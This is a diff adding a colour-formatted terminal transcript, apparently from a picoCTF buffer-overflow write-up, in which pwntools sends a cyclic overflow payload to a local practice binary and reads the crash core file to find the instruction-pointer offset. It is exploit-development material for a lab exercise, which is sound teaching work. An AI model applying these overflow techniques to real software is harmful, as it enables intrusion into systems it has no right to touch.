@@ -1,0 +1,21 @@
+<span style="color:#DC3958">$</span> python3 -q
+<span style="color:#DC3958">>>></span> from pwn import *
+<span style="color:#DC3958">>>></span> p = process('./vuln')
+[<span style="color:#9755B3">x</span>] Starting local process &apos;/home/kali/ctfs/pico22/buffer-overflow-3/vuln&apos;
+[<span style="color:#47D4B9"><b>+</b></span>] Starting local process &apos;/home/kali/ctfs/pico22/buffer-overflow-3/vuln&apos;: pid 1493
+<span style="color:#DC3958">>>></span> payload = cyclic(64) + b&apos;abcd&apos; + cyclic(128)
+<span style="color:#DC3958">>>></span> p.sendline(b&apos;196&apos;)
+<span style="color:#DC3958">>>></span> p.sendline(payload)
+<span style="color:#DC3958">>>></span> p.wait()
+[<span style="color:#277FFF"><b>*</b></span>] Process &apos;/home/kali/ctfs/pico22/buffer-overflow-3/vuln&apos; stopped with exit code -11 (SIGSEGV) (pid 1493)
+<span style="color:#DC3958">>>></span> core = Corefile(&apos;./core&apos;)
+[<span style="color:#9755B3">x</span>] Parsing corefile...
+[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-3/core&apos;
+    Arch:      i386-32-little
+    EIP:       0x61616165
+    ESP:       0xffa06160
+    Exe:       &apos;/home/kali/ctfs/pico22/buffer-overflow-3/vuln&apos; (0x8048000)
+    Fault:     0x61616165
+[<span style="color:#47D4B9"><b>+</b></span>] Parsing corefile...: Done
+<span style="color:#DC3958">>>></span> cyclic_find(0x61616165)
+16
